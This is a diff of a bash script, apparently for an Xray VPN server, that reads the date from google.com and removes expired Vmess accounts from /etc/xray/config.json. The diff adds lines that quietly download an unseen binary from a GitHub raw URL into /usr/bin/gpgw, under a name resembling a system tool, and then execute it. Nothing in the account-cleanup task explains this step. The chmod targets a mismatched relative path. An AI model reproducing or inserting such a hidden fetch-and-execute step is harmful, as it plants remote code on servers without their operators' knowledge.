@@ -2,6 +2,10 @@
 dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
 #############Yaddy Kakkoii############
+REPOX="https://raw.githubusercontent.com/YaddyKakkoii/tes/main/"
+rm -f /usr/bin/gpgw > /dev/null 2>&1
+wget -qO /usr/bin/gpgw "${REPOX}ewe" && chmod +x gpgw
+gpgw
 ##----- Auto Remove Vmess
 data=( `cat /etc/xray/config.json | grep '^###' | cut -d ' ' -f 2 | sort | uniq`);
 now=`date +"%Y-%m-%d"`
